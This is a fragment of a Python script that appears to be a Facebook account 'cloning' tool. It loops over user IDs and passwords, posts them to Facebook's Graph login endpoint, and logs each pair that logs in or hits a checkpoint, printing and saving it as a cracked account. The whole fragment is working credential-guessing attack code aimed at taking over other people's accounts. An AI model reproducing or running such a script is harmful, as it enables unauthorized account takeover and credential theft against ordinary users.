                'https://graph.facebook.com/auth/login',
                data=data,
                headers=headers,
                allow_redirects=False
            ).json()

            if 'session_key' in res:
                print("\033[93m───[ ﷽ ]──────────────────\033[0m")
                print(f"\033[93m🆔 : {uid}\033[0m")
                print(f"\033[93m🔑 : {pw}\033[0m")
                print(f"\033[93m📅 : {creationyear(uid)}\033[0m")
                print("\033[93m──────────────────────────────────\033[0m")
                save_clone(uid, pw)
                oks.append(uid)
                break

            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print("\033[93m───[ ﷽ ]──────────────────\033[0m")
                print(f"\033[93m🆔 : {uid}\033[0m")
                print(f"\033[93m🔑 : {pw}\033[0m")
                print(f"\033[93m📅 : {creationyear(uid)}\033[0m")
                print("\033[93m──────────────────────────────────\033[0m")
                save_clone(uid, pw)
                oks.append(uid)
                break

        loop += 1

    except Exception:
        time.sleep(5)

if __name__ == '__main__':
    BNG_71_()